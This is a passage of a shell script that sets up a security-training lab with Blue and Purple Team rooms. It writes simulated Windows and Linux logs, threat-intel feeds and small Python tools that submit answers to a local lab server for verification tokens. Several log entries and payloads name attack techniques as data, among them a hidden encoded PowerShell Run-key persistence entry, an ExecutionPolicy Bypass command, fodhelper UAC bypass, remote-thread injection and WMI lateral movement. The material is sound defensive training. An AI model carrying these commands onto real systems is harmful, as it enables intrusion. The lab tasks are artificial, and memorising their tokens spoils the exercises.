WIN_FILE = "/home/operator/hardening/windows_policy.json"

args = sys.argv[1:]
if "--linux" in args:
    print("=== LINUX SYSTEM HARDENING POSTURE AUDIT ===")
    if os.path.exists(SSHD_FILE):
        print(f"[*] SSH Daemon Configuration ({SSHD_FILE}):")
        with open(SSHD_FILE) as f:
            for line in f:
                if line.strip() and not line.startswith("#"):
                    print(f"    {line.strip()}")
    if os.path.exists(SUDO_FILE):
        print(f"[*] Sudoers Privileges ({SUDO_FILE}):")
        with open(SUDO_FILE) as f:
            for line in f:
                if line.strip() and not line.startswith("#"):
                    print(f"    {line.strip()}")
elif "--windows" in args:
    print("=== WINDOWS CIS BENCHMARK POSTURE AUDIT ===")
    if os.path.exists(WIN_FILE):
        with open(WIN_FILE) as f:
            pol = json.load(f)
        print(f"[*] AccountLockoutThreshold: {pol.get('account_lockout', {}).get('AccountLockoutThreshold')} (Insecure - Lockout Disabled)")
        print(f"[*] PowerShell ExecutionPolicy: {pol.get('powershell', {}).get('ExecutionPolicy')} (Insecure)")
        print(f"[*] SMBv1 Protocol: {pol.get('legacy_protocols', {}).get('SMBv1')} (Insecure)")
else:
    print("Usage: hardening_audit.py [--linux | --windows]")
EOF
chmod +x /home/operator/tools/hardening_audit.py

# 26. Initialize Blue Room 19: Threat Intelligence Assets
mkdir -p /var/log/threat_intel /home/operator/tools

cat << 'EOF' > /var/log/threat_intel/stix_feed.json
{
  "type": "bundle",
  "id": "bundle--9d04218a-f542-491a-8219-c0ffee192026",
  "objects": [
    {
      "type": "threat-actor",
      "id": "threat-actor--7a35b1d9-8218-11fa-ec29-84b238290348",
      "name": "APT-VOLT-VIPER",
      "aliases": ["ViperVolt", "GHOST-STORM"],
      "description": "State-sponsored cyber espionage threat group targeting critical energy infrastructure.",
      "primary_motivation": "espionage"
    },
    {
      "type": "malware",
      "id": "malware--8f4c2e6b-19a0-d3f7-8b54-921b72a912e8",
      "name": "VoltDrop",
      "is_family": true,
      "malware_types": ["dropper", "backdoor"]
    },
    {
      "type": "attack-pattern",
      "id": "attack-pattern--1566-001",
      "name": "Spearphishing Attachment",
      "external_references": [{"source_name": "mitre-attack", "external_id": "T1566.001"}]
    },
    {
      "type": "attack-pattern",
      "id": "attack-pattern--1059-001",
      "name": "PowerShell Execution",
      "external_references": [{"source_name": "mitre-attack", "external_id": "T1059.001"}]
    },
    {
      "type": "indicator",
      "name": "Malicious C2 Command & Control IPv4 Address",
      "pattern": "[ipv4-addr:value = '198.51.100.77']"
    },
    {
      "type": "indicator",
      "name": "Malicious Fast-Flux C2 Domain",
      "pattern": "[domain-name:value = 'update-cdn.voltcorp-support.internal']"
    }
  ]
}
EOF
chmod 644 /var/log/threat_intel/stix_feed.json

cat << 'EOF' > /var/log/threat_intel/iocs.csv
Indicator,Type,Context,Confidence,ThreatActor
198.51.100.77,IPv4,Active C2 Server,High,APT-VOLT-VIPER
update-cdn.voltcorp-support.internal,Domain,C2 Domain,High,APT-VOLT-VIPER
34049ea3151168bea705f416fabb3c8919ba7563ad650cff2af6e1b7745fc465,SHA-256,VoltDrop Dropper Binary,High,APT-VOLT-VIPER
T1566.001,MITRE-ATT&CK,Spearphishing Attachment,High,APT-VOLT-VIPER
T1059.001,MITRE-ATT&CK,PowerShell Execution,High,APT-VOLT-VIPER
EOF
chmod 644 /var/log/threat_intel/iocs.csv

cat << 'EOF' > /home/operator/tools/intel_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import csv

STIX_FILE = "/var/log/threat_intel/stix_feed.json"
IOC_FILE = "/var/log/threat_intel/iocs.csv"

args = sys.argv[1:]
if "--iocs" in args:
    print("=== CYBER THREAT INTELLIGENCE (CTI) IOC FEED ===")
    if not os.path.exists(IOC_FILE):
        print(f"[-] Error: {IOC_FILE} not found.")
        sys.exit(1)
    with open(IOC_FILE, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            print(f"[{row['Type']}] {row['Indicator']} | Context: {row['Context']} | Actor: {row['ThreatActor']} | Confidence: {row['Confidence']}")
elif "--attck" in args:
    print("=== MITRE ATT&CK ENTERPRISE MAPPING ===")
    if not os.path.exists(STIX_FILE):
        print(f"[-] Error: {STIX_FILE} not found.")
        sys.exit(1)
    with open(STIX_FILE, encoding="utf-8") as f:
        bundle = json.load(f)
    for obj in bundle.get("objects", []):
        if obj.get("type") == "attack-pattern":
            ext = obj.get("external_references", [{}])[0].get("external_id", "N/A")
            print(f"[*] Technique ID: {ext} - {obj.get('name')}")
else:
    print("Usage: intel_tool.py [--iocs | --attck]")
EOF
chmod +x /home/operator/tools/intel_tool.py

# 27. Initialize Blue Room 20: Blue Team Capstone Assets
mkdir -p /var/log/capstone /home/operator/tools

cat << 'EOF' > /var/log/capstone/incident_overview.json
{
  "case_id": "CAPSTONE-IR-FINAL",
  "severity": "CRITICAL",
  "organization": "VoltCorp Global Infrastructure",
  "affected_systems": [
    {
      "hostname": "DB-PROD-01",
      "ip": "10.10.20.15",
      "role": "Production Database Server",
      "os": "Windows Server 2022 Datacenter",
      "compromise_level": "FULL_ADMINISTRATIVE"
    }
  ],
  "adversary": {
    "threat_actor": "APT-VOLT-VIPER",
    "c2_ip": "198.51.100.77",
    "c2_domain": "update-cdn.voltcorp-support.internal",
    "exfil_volume_mb": 2400
  },
  "active_threats": {
    "process_id": 3912,
    "service_name": "svc_winupdater",
    "binary_path": "C:\\Windows\\Temp\\win_updater.exe",
    "compromised_account": "svc_db_sync",
    "session_token": "ST-VOLT-9921",
    "ram_evidence_hash": "7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123"
  }
}
EOF
chmod 644 /var/log/capstone/incident_overview.json

cat << 'EOF' > /home/operator/tools/capstone_investigator.py
#!/usr/bin/env python3
import sys
import os
import json

INC_FILE = "/var/log/capstone/incident_overview.json"

if not os.path.exists(INC_FILE):
    print(f"[-] Error: Capstone incident file {INC_FILE} not found.")
    sys.exit(1)

with open(INC_FILE, encoding="utf-8") as f:
    inc = json.load(f)

args = sys.argv[1:]
if "--detect" in args:
    print(f"=== CAPSTONE STAGE 1 & 2: INTRUSION DETECTION ===")
    print(f"Incident Case: {inc.get('case_id')} [Severity: {inc.get('severity')}]")
    print(f"Compromised Host: {inc.get('affected_systems', [{}])[0].get('hostname')} ({inc.get('affected_systems', [{}])[0].get('ip')})")
    print(f"External Adversary IP: {inc.get('adversary', {}).get('c2_ip')}")
elif "--hunt" in args:
    print("=== CAPSTONE STAGE 3: ADVERSARY THREAT HUNTING ===")
    th = inc.get("active_threats", {})
    print(f"Malicious Spawned PID: {th.get('process_id')}")
    print(f"Persistence Service:  {th.get('service_name')}")
    print(f"Payload Binary:       {th.get('binary_path')}")
    print("MITRE ATT&CK Technique: T1059.001 (PowerShell Execution)")
elif "--forensics" in args:
    print("=== CAPSTONE STAGE 4: FORENSIC EVIDENCE PRESERVATION ===")
    th = inc.get("active_threats", {})
    print(f"Volatile RAM Artifact Hash (SHA-256): {th.get('ram_evidence_hash')}")
    print("Integrity Status: VERIFIED UNCOMPROMISED")
elif "--intel" in args or "--triage" in args:
    print("=== CAPSTONE STAGE 5 & 6: THREAT INTELLIGENCE & TRIAGE ===")
    adv = inc.get("adversary", {})
    print(f"Attributed Threat Actor: {adv.get('threat_actor')}")
    print(f"Data Exfiltration Volume: {adv.get('exfil_volume_mb')} MB")
    print(f"Assessed Incident Severity: {inc.get('severity')}")
elif "--contain" in args:
    print("=== CAPSTONE STAGE 7 & 8: CONTAINMENT & ERADICATION ===")
    th = inc.get("active_threats", {})
    sys_name = inc.get('affected_systems', [{}])[0].get('hostname')
    print(f"Isolate Host:            {sys_name}")
    print(f"Terminate Backdoor PID:  {th.get('process_id')}")
    print(f"Revoke Credential Token: {th.get('session_token')}")
else:
    print("Usage: capstone_investigator.py [--detect | --hunt | --forensics | --intel | --triage | --contain]")
EOF
chmod +x /home/operator/tools/capstone_investigator.py

# ============================================================================
# PURPLE TEAM ROOM 01: PURPLE TEAM FOUNDATIONS
# ============================================================================
mkdir -p /home/operator/purple /home/operator/tools
cat << 'EOF' > /home/operator/purple/scope_manifest.json
{
  "exercise_id": "PT-2026-001",
  "exercise_name": "Collaborative Detection Verification Exercise",
  "mission": "Validate and improve defensive detection capabilities through structured Red/Blue collaboration",
  "collaboration_model": "COLLABORATIVE_PAIRING",
  "coordination_lead": "secops-lead@voltcorp.internal",
  "red_team_lead": "red-lead@voltcorp.internal",
  "blue_team_lead": "blue-lead@voltcorp.internal",
  "focus_tactics": ["Execution", "Persistence", "Credential Access"],
  "focus_technique": "T1059.001",
  "target_asset": "10.10.14.90",
  "target_port": 8301,
  "roes_acknowledged": true,
  "rules_of_engagement": [
    "Collaborative pairing throughout execution",
    "Targeted execution without business disruption",
    "Immediate verification of detection telemetry",
    "Continuous feedback and detection tuning"
  ]
}
EOF
chmod 644 /home/operator/purple/scope_manifest.json

cat << 'EOF' > /home/operator/tools/purple_foundations_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8301
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-scope" in args:
    with open("/home/operator/purple/scope_manifest.json") as f:
        print(f.read())
elif "--submit-scope" in args:
    payload = {
        "exercise_id": "PT-2026-001",
        "collaboration_model": "COLLABORATIVE_PAIRING",
        "focus_technique": "T1059.001"
    }
    res = http_post("/api/purple/scope", payload)
    print(json.dumps(res, indent=2))
elif "--map-telemetry" in args:
    payload = {
        "exercise_id": "PT-2026-001",
        "technique_id": "T1059.001",
        "telemetry_source": "Sysmon EventID 1 (Process Create)",
        "detection_status": "LOGGED"
    }
    res = http_post("/api/purple/telemetry-map", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PURPLE_TELEMETRY_MAP_VERIFIED":
        print("\n[+] Verification Token: PURPLE_TELEMETRY_MAP_VERIFIED")
elif "--finalize" in args or "--approve-exercise" in args:
    payload = {
        "action": "FINALIZE_PURPLE_FOUNDATIONS",
        "exercise_id": "PT-2026-001"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PURPLE_FOUNDATIONS_EXERCISE_APPROVED":
        print("\n[+] Verification Token: PURPLE_FOUNDATIONS_EXERCISE_APPROVED")
else:
    print("Usage: purple_foundations_tool.py [--show-scope | --submit-scope | --map-telemetry | --finalize]")
EOF
chmod +x /home/operator/tools/purple_foundations_tool.py

# ============================================================================
# PURPLE TEAM ROOM 02: MITRE ATT&CK FUNDAMENTALS
# ============================================================================
mkdir -p /var/log/attck_evidence
cat << 'EOF' > /var/log/attck_evidence/auth_events.json
[
  {
    "timestamp": "2026-11-15T09:22:15Z",
    "event_id": 4769,
    "event_name": "A Kerberos service ticket was requested",
    "service_name": "MSSQLSvc/db01.corp",
    "ticket_options": "0x40810000",
    "ticket_encryption_type": "0x17",
    "client_address": "10.10.14.10",
    "technique_id": "T1558.003",
    "tactic": "Credential Access",
    "notes": "RC4 Kerberos service ticket requested for SPN - indicative of Kerberoasting attack"
  }
]
EOF
chmod 644 /var/log/attck_evidence/auth_events.json

cat << 'EOF' > /var/log/attck_evidence/persistence_events.json
[
  {
    "timestamp": "2026-11-15T09:35:40Z",
    "event_id": 4657,
    "event_name": "A registry value was modified",
    "registry_path": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "value_name": "SecurityHealthUpdate",
    "value_data": "powershell.exe -WindowStyle Hidden -Enc SABFAFgA...",
    "technique_id": "T1547.001",
    "tactic": "Persistence",
    "notes": "Adversary established persistence via Windows Registry Run key"
  }
]
EOF
chmod 644 /var/log/attck_evidence/persistence_events.json

cat << 'EOF' > /home/operator/tools/attck_mapping_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8302
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-evidence" in args:
    print("=== EVIDENCE ARTIFACT 1: AUTHENTICATION (KERBEROS) ===")
    with open("/var/log/attck_evidence/auth_events.json") as f:
        print(f.read())
    print("\n=== EVIDENCE ARTIFACT 2: PERSISTENCE (REGISTRY) ===")
    with open("/var/log/attck_evidence/persistence_events.json") as f:
        print(f.read())
elif "--map-evidence" in args:
    payload = {
        "techniques": ["T1558.003", "T1547.001"],
        "kerberoasting_technique": "T1558.003",
        "persistence_technique": "T1547.001"
    }
    res = http_post("/api/attck/map-evidence", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "ATTCK_EVIDENCE_MAPPING_VERIFIED":
        print("\n[+] Verification Token: ATTCK_EVIDENCE_MAPPING_VERIFIED")
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "SUBMIT_ATTCK_LIFECYCLE_MAPPING"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "ATTCK_LIFECYCLE_MAPPING_COMPLETE":
        print("\n[+] Verification Token: ATTCK_LIFECYCLE_MAPPING_COMPLETE")
else:
    print("Usage: attck_mapping_tool.py [--show-evidence | --map-evidence | --challenge]")
EOF
chmod +x /home/operator/tools/attck_mapping_tool.py

# ============================================================================
# PURPLE TEAM ROOM 03: ATTACK SIMULATION PLANNING
# ============================================================================
mkdir -p /home/operator/simulation
cat << 'EOF' > /home/operator/simulation/exercise_spec.json
{
  "simulation_id": "SIM-2026-ALPHA",
  "target_ip": "10.10.14.90",
  "target_port": 8303,
  "governance": {
    "framework": "Rules of Engagement",
    "authorized_window": "09:00-17:00 UTC",
    "production_impact": "ZERO_TOLERANCE",
    "rollback_mandatory": true,
    "rollback_objective": "To prevent leaving systems in an insecure state"
  },
  "planned_steps": [
    {
      "step_id": 1,
      "technique": "T1059.001",
      "name": "PowerShell Script Execution Simulation",
      "command": "powershell.exe -ExecutionPolicy Bypass -File audit_check.ps1",
      "expected_telemetry": "Sysmon EventID 1 (Process Create)",
      "rollback": "Remove audit_check.ps1 and revert execution policy"
    }
  ]
}
EOF
chmod 644 /home/operator/simulation/exercise_spec.json

cat << 'EOF' > /home/operator/tools/simulation_planner.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8303
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--view-spec" in args:
    with open("/home/operator/simulation/exercise_spec.json") as f:
        print(f.read())
elif "--validate-scope" in args:
    payload = {
        "target_ip": "10.10.14.90",
        "roe_accepted": True,
        "simulation_id": "SIM-2026-ALPHA"
    }
    res = http_post("/api/simulation/validate-scope", payload)
    print(json.dumps(res, indent=2))
elif "--register-step" in args:
    payload = {
        "technique_id": "T1059.001",
        "command": "powershell.exe -ExecutionPolicy Bypass -File audit_check.ps1",
        "expected_detection_event": "Sysmon EventID 1",
        "rollback": "Remove audit_check.ps1"
    }
    res = http_post("/api/simulation/register-step", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "SIMULATION_STEP_REGISTERED":
        print("\n[+] Verification Token: SIMULATION_STEP_REGISTERED")
elif "--approve-plan" in args or "--challenge" in args:
    payload = {
        "action": "APPROVE_SIMULATION_PLAN",
        "plan_id": "SIM-2026-ALPHA"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "ATTACK_SIMULATION_PLAN_APPROVED":
        print("\n[+] Verification Token: ATTACK_SIMULATION_PLAN_APPROVED")
else:
    print("Usage: simulation_planner.py [--view-spec | --validate-scope | --register-step | --approve-plan]")
EOF
chmod +x /home/operator/tools/simulation_planner.py

# ============================================================================
# PURPLE TEAM ROOM 04: RECONNAISSANCE VS MONITORING
# ============================================================================
mkdir -p /var/log/recon
cat << 'EOF' > /var/log/recon/scan_results.txt
# Nmap 7.94 scan report for 10.10.14.90
Host is up (0.00042s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap
8090/tcp open  opsmessaging
8094/tcp open  unknown-recon-target
MAC Address: 02:42:0A:0A:0E:5A (Docker Virtual)
Scan Type: TCP SYN Stealth Scan (-sS)
EOF
chmod 644 /var/log/recon/scan_results.txt

cat << 'EOF' > /var/log/recon/sensor_alerts.log
[**] [1:200142:1] ET SCAN Potential Aggressive Port Scan Detected [**]
[Classification: Attempted Information Leak] [Priority: 2]
11/15-10:14:02.108239 10.10.14.10:48212 -> 10.10.14.90:8094
TCP TTL:64 TOS:0x0 ID:39102 IpLen:20 DgmLen:40 DF
******S* Seq: 0x39102001 Ack: 0x0 Win: 1024 TcpLen: 20
Alert Details: PORT_SCAN_DETECTED (HIGH_CONFIDENCE)
Targeted Exposed Service Port: 8094
EOF
chmod 644 /var/log/recon/sensor_alerts.log

cat << 'EOF' > /home/operator/tools/recon_correlator.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8304
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-scan" in args:
    with open("/var/log/recon/scan_results.txt") as f:
        print(f.read())
elif "--show-alerts" in args:
    with open("/var/log/recon/sensor_alerts.log") as f:
        print(f.read())
elif "--correlate" in args:
    payload = {
        "scan_type": "SYN",
        "targeted_port": "8094",
        "sensor_alert": "PORT_SCAN_DETECTED"
    }
    res = http_post("/api/monitoring/correlate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "RECON_MONITORING_CORRELATION_CONFIRMED":
        print("\n[+] Verification Token: RECON_MONITORING_CORRELATION_CONFIRMED")
elif "--tune-threshold" in args:
    payload = {
        "syn_threshold_pps": 20,
        "action": "ALERT"
    }
    res = http_post("/api/monitoring/tune-threshold", payload)
    print(json.dumps(res, indent=2))
elif "--finalize" in args or "--challenge" in args:
    payload = {
        "action": "VALIDATE_RECON_MONITORING"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "RECON_VS_MONITORING_VALIDATED":
        print("\n[+] Verification Token: RECON_VS_MONITORING_VALIDATED")
else:
    print("Usage: recon_correlator.py [--show-scan | --show-alerts | --correlate | --tune-threshold | --finalize]")
EOF
chmod +x /home/operator/tools/recon_correlator.py

# ============================================================================
# PURPLE TEAM ROOM 05: EMULATING PRIVILEGE ESCALATION TECHNIQUES
# ============================================================================
mkdir -p /var/log/privesc
cat << 'EOF' > /var/log/privesc/uac_elevation_events.json
[
  {
    "EventID": 4688,
    "TimeCreated": "2026-11-15T12:00:15.102Z",
    "SubjectUserName": "operator",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\System32\\fodhelper.exe",
    "CommandLine": "cmd.exe /k whoami /groups",
    "MandatoryLabel": "Mandatory Label\\High Mandatory Level",
    "TokenElevationType": "TokenElevationTypeFull (2)"
  },
  {
    "EventID": 1,
    "TimeCreated": "2026-11-15T12:00:15.105Z",
    "Provider": "Microsoft-Windows-Sysmon",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ParentImage": "C:\\Windows\\System32\\fodhelper.exe",
    "IntegrityLevel": "High",
    "User": "CORP\\operator"
  }
]
EOF
chmod 644 /var/log/privesc/uac_elevation_events.json

cat << 'EOF' > /home/operator/tools/privesc_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8305
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/privesc/uac_elevation_events.json") as f:
        print(f.read())
elif "--emulate-uac" in args:
    payload = {
        "technique": "T1548.002",
        "method": "FODHELPER",
        "command": "whoami /groups"
    }
    res = http_post("/api/privesc/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PRIVESC_EMULATION_VERIFIED":
        print("\n[+] Verification Token: PRIVESC_EMULATION_VERIFIED")
elif "--tune-detection" in args:
    payload = {
        "event_id": 4688,
        "parent_process": "fodhelper.exe",
        "action": "DEPLOY_RULE"
    }
    res = http_post("/api/privesc/tune-detection", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_PRIVESC_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PRIVESC_DETECTION_VALIDATED":
        print("\n[+] Verification Token: PRIVESC_DETECTION_VALIDATED")
else:
    print("Usage: privesc_emulation_tool.py [--show-telemetry | --emulate-uac | --tune-detection | --challenge]")
EOF
chmod +x /home/operator/tools/privesc_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 06: EMULATING DEFENSE EVASION & PROCESS INJECTION
# ============================================================================
mkdir -p /var/log/injection
cat << 'EOF' > /var/log/injection/sysmon_injection_events.json
[
  {
    "EventID": 8,
    "Provider": "Microsoft-Windows-Sysmon",
    "TimeCreated": "2026-11-15T12:05:44.821Z",
    "SourceImage": "C:\\Windows\\Temp\\injector.exe",
    "SourceProcessId": 3120,
    "TargetImage": "C:\\Windows\\explorer.exe",
    "TargetProcessId": 4820,
    "StartAddress": "0x00007FFB32A1000",
    "StartFunction": "LoadLibraryW"
  },
  {
    "EventID": 10,
    "Provider": "Microsoft-Windows-Sysmon",
    "TimeCreated": "2026-11-15T12:05:43.719Z",
    "SourceImage": "C:\\Windows\\Temp\\injector.exe",
    "TargetImage": "C:\\Windows\\explorer.exe",
    "GrantedAccess": "0x0020",
    "CallTrace": "UNKNOWN_MODULE|C:\\Windows\\Temp\\injector.exe"
  }
]
EOF
chmod 644 /var/log/injection/sysmon_injection_events.json

cat << 'EOF' > /home/operator/tools/injection_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8306
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/injection/sysmon_injection_events.json") as f:
        print(f.read())
elif "--emulate-injection" in args:
    payload = {
        "injection_type": "CREATEREMOTETHREAD",
        "target_process": "explorer.exe",
        "allocation_protection": "PAGE_EXECUTE_READWRITE"
    }
    res = http_post("/api/injection/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "INJECTION_EMULATION_VERIFIED":
        print("\n[+] Verification Token: INJECTION_EMULATION_VERIFIED")
elif "--tune-edr" in args:
    payload = {
        "rule_type": "UNBACKED_MEMORY_SCAN",
        "action": "BLOCK_AND_ALERT"
    }
    res = http_post("/api/injection/tune-edr", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_DEFENSE_EVASION_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "DEFENSE_EVASION_DETECTION_VALIDATED":
        print("\n[+] Verification Token: DEFENSE_EVASION_DETECTION_VALIDATED")
else:
    print("Usage: injection_emulation_tool.py [--show-telemetry | --emulate-injection | --tune-edr | --challenge]")
EOF
chmod +x /home/operator/tools/injection_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 07: EMULATING LATERAL MOVEMENT (SMB, WMI, WINRM)
# ============================================================================
mkdir -p /var/log/lateral
cat << 'EOF' > /var/log/lateral/remote_exec_events.json
[
  {
    "EventID": 4624,
    "TimeCreated": "2026-11-15T12:12:01.302Z",
    "TargetUserName": "svc_admin",
    "LogonType": 3,
    "LogonProcessName": "NtLmSsp",
    "IpAddress": "10.10.14.10",
    "Description": "An account was successfully logged on via network authentication (Logon Type 3)"
  },
  {
    "EventID": 7045,
    "TimeCreated": "2026-11-15T12:12:03.119Z",
    "ServiceName": "PSEXESVC",
    "ImagePath": "%SystemRoot%\\PSEXESVC.exe",
    "ServiceType": "user mode service",
    "StartType": "demand start",
    "AccountName": "LocalSystem"
  },
  {
    "EventID": 5861,
    "Provider": "Microsoft-Windows-WMI-Activity",
    "TimeCreated": "2026-11-15T12:12:05.420Z",
    "Operation": "ExecQuery - root\\cimv2: SELECT * FROM Win32_Process",
    "ClientMachine": "OPERATOR-WS"
  }
]
EOF
chmod 644 /var/log/lateral/remote_exec_events.json

cat << 'EOF' > /home/operator/tools/lateral_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8307
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/lateral/remote_exec_events.json") as f:
        print(f.read())
elif "--emulate-lateral" in args:
    payload = {
        "protocol": "WMI",
        "target_host": "10.10.14.90",
        "command": "cmd.exe /c whoami"
    }
    res = http_post("/api/lateral/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "LATERAL_EMULATION_VERIFIED":
        print("\n[+] Verification Token: LATERAL_EMULATION_VERIFIED")
elif "--tune-rule" in args:
    payload = {
        "rule_id": "CORR-WMI-01",
        "action": "ENABLE_CORRELATION"
    }
    res = http_post("/api/lateral/tune-rule", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_LATERAL_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "LATERAL_MOVEMENT_DETECTION_VALIDATED":
        print("\n[+] Verification Token: LATERAL_MOVEMENT_DETECTION_VALIDATED")
else:
    print("Usage: lateral_emulation_tool.py [--show-telemetry | --emulate-lateral | --tune-rule | --challenge]")
EOF
chmod +x /home/operator/tools/lateral_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 08: EMULATING PERSISTENCE MECHANISMS
# ============================================================================
mkdir -p /var/log/persistence
cat << 'EOF' > /var/log/persistence/scheduled_task_events.json
[
  {
    "EventID": 4698,
    "TimeCreated": "2026-11-15T12:20:11.412Z",
    "SubjectUserName": "operator",
    "TaskName": "\\Microsoft\\Windows\\Customer Experience\\TelemetryUpdate",
    "Action": "C:\\Windows\\Temp\\updater.ps1",
    "Trigger": "ONLOGON",
    "Principal": "NT AUTHORITY\\SYSTEM",
    "TaskContent": "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Actions><Exec><Command>C:\\Windows\\Temp\\updater.ps1</Command></Exec></Actions></Task>"
  }
]
EOF
chmod 644 /var/log/persistence/scheduled_task_events.json

cat << 'EOF' > /home/operator/tools/persistence_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8308
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/persistence/scheduled_task_events.json") as f:
        print(f.read())
elif "--emulate-task" in args:
    payload = {
        "task_name": "SecurityTelemetryUpdate",
